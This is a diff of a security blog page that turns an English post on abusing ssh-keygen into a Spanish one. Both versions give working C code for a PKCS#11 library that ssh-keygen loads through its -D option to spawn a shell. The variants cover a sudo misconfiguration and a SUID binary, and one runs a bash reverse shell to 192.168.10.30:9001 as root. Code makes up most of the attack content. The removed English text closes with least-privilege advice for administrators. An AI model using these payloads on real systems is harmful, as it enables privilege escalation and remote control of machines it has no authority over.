@@ -18,7 +18,7 @@
     
     
       
-        <title>Abusing ssh-keygen - Atlansec</title>
+        <title>Abusando de ssh-keygen - Atlansec</title>
       
     
     
@@ -55,11 +55,11 @@
       
         <meta  property="og:type"  content="website" >
       
-        <meta  property="og:title"  content="Abusing ssh-keygen - Atlansec" >
+        <meta  property="og:title"  content="Abusando de ssh-keygen - Atlansec" >
       
         <meta  property="og:description"  content="None" >
       
-        <meta  property="og:image"  content="https://atlansec.es/assets/images/social/en/blog/posts/17-10-2024.png" >
+        <meta  property="og:image"  content="https://atlansec.es/assets/images/social/es/blog/posts/17-10-2024.png" >
       
         <meta  property="og:image:type"  content="image/png" >
       
@@ -71,11 +71,11 @@
       
         <meta  name="twitter:card"  content="summary_large_image" >
       
-        <meta  name="twitter:title"  content="Abusing ssh-keygen - Atlansec" >
+        <meta  name="twitter:title"  content="Abusando de ssh-keygen - Atlansec" >
       
         <meta  name="twitter:description"  content="None" >
       
-        <meta  name="twitter:image"  content="https://atlansec.es/assets/images/social/en/blog/posts/17-10-2024.png" >
+        <meta  name="twitter:image"  content="https://atlansec.es/assets/images/social/es/blog/posts/17-10-2024.png" >
       
     
     
@@ -96,7 +96,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#abusing-ssh-keygen" class="md-skip">
+        <a href="#abusando-de-ssh-keygen" class="md-skip">
           Saltar a contenido
         </a>
       
@@ -427,65 +427,6 @@
     
   
   
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Tabla de contenidos
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#how-to-generate-the-payload" class="md-nav__link">
-    <span class="md-ellipsis">
-      How to generate the payload
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#profit" class="md-nav__link">
-    <span class="md-ellipsis">
-      Profit
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Profit">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#case-1-sudo-ssh-keygen" class="md-nav__link">
-    <span class="md-ellipsis">
-      Case 1: Sudo SSH-Keygen
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#case-2-ssh-keygen-suid" class="md-nav__link">
-    <span class="md-ellipsis">
-      Case 2: SSH Keygen SUID
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#final-thoughts" class="md-nav__link">
-    <span class="md-ellipsis">
-      Final Thoughts
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
 </nav>
                   </div>
                 </div>
@@ -499,19 +440,17 @@
                   
 
 
-<h1 id="abusing-ssh-keygen">Abusing ssh-keygen</h1>
-<p>SSH-Keygen is a tool that allows you to create and manage SSH keys, this tool is present in most UNIX systems today as a tool to facilitate the management of SSH keys.</p>
-<p>In this article we will explore some methods to abuse this tool with certain configurations as a method of persistence or privilege escalation on the system.</p>
-<!-- more -->
-
-<p>In particular, we will abuse a specific functionality of this binary that allows the loading of public keys from a card reader library, this option is the <strong>-D</strong> parameter, its use is as follows: </p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>ssh-keygen<span class="w"> </span>-D<span class="w"> </span>./lib.so
+<h1 id="abusando-de-ssh-keygen">Abusando de ssh-keygen</h1>
+<p>SSH-Keygen es una herramienta que permite crear y gestionar claves SSH, esta herramienta esta presente en la mayoría de los sistemas UNIX hoy en día como herramienta para facilitar la gestión de las claves SSH.</p>
+<p>En este articulo exploraremos un par de métodos para abusar de esta herramienta con ciertas configuraciones como método de persistencia o de escalada de privilegios en el sistema.</p>
+<p>En concreto abusaremos de una funcionalidad concreta de este binario que permite la carga de claves publicas desde una librería de lectura de tarjetas, esta opción es el parámetro -D, su uso es el siguiente.</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">ssh</span><span class="o">-</span><span class="n">keygen</span><span class="w"> </span><span class="o">-</span><span class="n">D</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">lib</span><span class="p">.</span><span class="n">so</span>
 </span></code></pre></div>
-<h2 id="how-to-generate-the-payload">How to generate the payload</h2>
-<p>Now that we've explained how to use this function, let's look in more detail at how to generate a loadable payload, for which we'll first need to obtain a version of pkcs11.h . This header file is where we define the data types needed for the function of our library that will call ssh-keygen when using the <strong>-D</strong> parameter. </p>
-<p>In our case, we will go to the Open Smart Card repository and download the version we need from the following URL</p>
-<p><a href="https://github.com/OpenSC/libp11/blob/master/src/pkcs11.h">Github Code</a> </p>
-<p>With this file we will proceed to write a small program in C with the necessary structure to be executed by ssh-keygen, in our case this program will spawn a bash shell.</p>
+<h1 id="como-generamos-el-payload">Como generamos el payload</h1>
+<p>Una vez explicado que nos lleva a poder explotar esta función, vamos a explicar en mayor detalle como generar un payload cargable, para ello primero de todo será obtener una versión de pkcs11.h . En este archivo de cabeceras es donde se definen los tipos de datos necesarios para la función de nuestra librería que llamara ssh-keygen al usar el parámetro -D. </p>
+<p>En nuestro caso, para ello iremos al repositorio de Open Smart Card y descargaremos la versión que necesitamos de la siguiente url:</p>
+<p>https://github.com/OpenSC/libp11/blob/master/src/pkcs11.h</p>
+<p>Con este archivo procederemos a escribir un pequeño programa en C con la estructura necesaria para ser ejecutado por ssh-keygen, en nuestro caso este programa spwanea una shell en bash.</p>
 <div class="language-c highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;pkcs11.h&quot;</span>
 </span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
 </span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
@@ -536,20 +475,20 @@
 </span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">CKR_OK</span><span class="p">;</span>
 </span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="p">}</span>
 </span></code></pre></div>
-<p>Once compiled we can load it as a library as indicated in the introduction. </p>
-<h2 id="profit">Profit</h2>
-<h3 id="case-1-sudo-ssh-keygen">Case 1: Sudo SSH-Keygen</h3>
-<p>Let's take advantage of a scenario where our user has permissions to execute the ssh-keygen command as root.</p>
+<p>Una vez compilado podemos cargarlo como librería como indicamos en la introducción. </p>
+<h1 id="profit">Profit</h1>
+<h2 id="caso-1-sudo-ssh-keygen">Caso 1: Sudo SSH-Keygen</h2>
+<p>Vamos a explotar un escenario donde nuestro usuario tiene permisos para ejecutar el comando ssh-keygen como root.</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>pnavas<span class="w"> </span>on<span class="w"> </span>test:
 </span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/snap/bin,
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
 </span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">    </span>use_pty
 </span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
 </span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>User<span class="w"> </span>pnavas<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>permx:
 </span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">    </span><span class="o">(</span>ALL<span class="w"> </span>:<span class="w"> </span>ALL<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/usr/bin/ssh-keygen
 </span></code></pre></div>
-<p>In this case, instead of using a simple bash call, we will load a reverse shell.</p>
-<div class="language-c highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="cp">#include ‘pkcs11.h’</span>
+<p>En este ese caso, en lugar de hacer uso de una simple llamada a bash vamos a cargar una reverse shell.</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;pkcs11.h&quot;</span>
 </span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
 </span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
 </span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
@@ -559,24 +498,24 @@
 </span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>
 </span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pid</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 </span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">‘</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="err">’</span><span class="p">;</span>
-</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">args</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="err">‘</span><span class="o">-</span><span class="n">c</span><span class="err">’</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="err">‘</span><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">&gt;&amp;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">192.168.10.30</span><span class="o">/</span><span class="mi">9001</span><span class="w"> </span><span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span><span class="err">’</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">};</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;/bin/bash&quot;</span><span class="p">;</span>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">args</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="s">&quot;bash -i &gt;&amp; /dev/tcp/192.168.10.30/9001 0&gt;&amp;1&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">};</span>
 </span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="w">        </span><span class="n">execv</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">args</span><span class="p">);</span>
 </span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>
 </span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="w">   </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">pid</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 </span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="w">        </span><span class="n">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
 </span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="err">‘</span><span class="n">fork</span><span class="err">’</span><span class="p">);</span>
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;fork&quot;</span><span class="p">);</span>
 </span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
 </span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="w">    </span><span class="p">}</span>
 </span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>
 </span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">CKR_OK</span><span class="p">;</span>
 </span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a><span class="p">}</span>
 </span></code></pre></div>
-<p>As a result, when we load it, we will get a root connection in our listener, we could modify it to run a shell simply as in the example in the theory section </p>
-<h3 id="case-2-ssh-keygen-suid">Case 2: SSH Keygen SUID</h3>
-<p>In this scenario we are going to exploit a slightly less common scenario where ssh-keygen has the SUID bit set, in this case to keep the SUID privileges we need to change the library code a bit so that the shell keeps the privileges</p>
-<div class="language-c highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="cp">#include ‘pkcs11.h’</span>
+<p>Como resultado, al cargarla obtendremos una conexión como root en nuestro listener, podríamos cambiarlo para ejecutar una shell sencillamente como en el ejemplo de la sección de teoría </p>
+<h2 id="caso-2-ssh-keygen-suid">Caso 2: SSH-Keygen SUID</h2>
+<p>En este escenario vamos a explotar un escenario algo menos común donde ssh-keygen tiene el bit del SUID activado, en este caso para mantener los privilegios del SUID tenemos que cambiar un poco el código de la librería para que la shell mantenga los privilegios</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;pkcs11.h&quot;</span>
 </span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
 </span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
@@ -586,28 +525,21 @@
 </span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>
 </span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pid</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 </span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">‘</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="err">’</span><span class="p">;</span>
-</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">args</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="err">‘</span><span class="o">-</span><span class="n">p</span><span class="err">’</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">};</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;/bin/bash&quot;</span><span class="p">;</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">args</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-p&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">};</span>
 </span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="w">        </span><span class="n">execv</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">args</span><span class="p">);</span>
 </span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>
 </span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="w">   </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">pid</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 </span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="w">        </span><span class="n">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
 </span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="err">‘</span><span class="n">fork</span><span class="err">’</span><span class="p">);</span>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;fork&quot;</span><span class="p">);</span>
 </span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
 </span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a><span class="w">    </span><span class="p">}</span>
 </span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>
 </span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">CKR_OK</span><span class="p">;</span>
 </span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a><span class="p">}</span>
 </span></code></pre></div>
-<p>Once compiled, we can run the command to load the library and get a shell with the necessary privileges.</p>
-<h2 id="final-thoughts">Final Thoughts</h2>
-<p>As demonstrated, ssh-keygen is a powerful tool that, when misconfigured or misused, can become a significant security risk. The scenarios presented in this article highlight the importance of properly configuring and restricting access to binaries with elevated privileges.</p>
-<p>By understanding and proactively managing the capabilities and risks associated with common tools like ssh-keygen, administrators can ensure the integrity and security of their systems. </p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
-<p>Always adopt the principle of least privilege and conduct regular security audits to minimize attack surfaces.</p>
-</div>
+<p>Una vez compilado podemos ejecutar el comando para cargar la librería y obtener una shell con los privilegios necesarios</p>
 
 
 
